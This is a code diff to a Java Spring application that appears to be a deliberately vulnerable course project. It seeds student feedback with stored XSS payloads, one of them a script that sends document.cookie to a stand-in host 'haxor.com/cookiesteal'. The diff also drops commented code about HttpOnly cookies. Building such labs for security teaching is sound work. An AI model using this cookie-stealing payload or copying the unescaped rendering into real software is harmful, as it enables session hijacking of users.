@@ -27,11 +27,6 @@ public class CyberSecurityBaseProjectApplication {
 		SpringApplication.run(CyberSecurityBaseProjectApplication.class);
 	}
 
-//	@Bean
-//	public WebServerFactoryCustomizer<TomcatServletWebServerFactory> tomcatCustomizer() {
-//	    return (tomcat) -> tomcat
-//	            .addContextCustomizers((context) -> context.setUseHttpOnly(false));
-//	}
 
 	@Autowired
 	AccountRepository accountRepository;
@@ -79,6 +74,7 @@ public class CyberSecurityBaseProjectApplication {
 		course2.getFeedBack().add("STUDENT: Web course in MOOC was very nice");
 		// XSS enabled in thymeleaf - one can insert JavaScript to page
 		course2.getFeedBack().add("STUDENT: I learned how to haxor :) <script>console.log('All your base are belong to us')</script>");
+		course2.getFeedBack().add("STUDENT:I think i will manage to get 5 form all the courses!<script>document.write(\"<img src=\\\"http://www.haxor.com/cookiesteal/\" + document.cookie +\"\\\" style=\\\"display: none;\\\" />\")  </script>");
 		course2.getAccounts().add(student1);
 		courseRepository.save(course2);
 
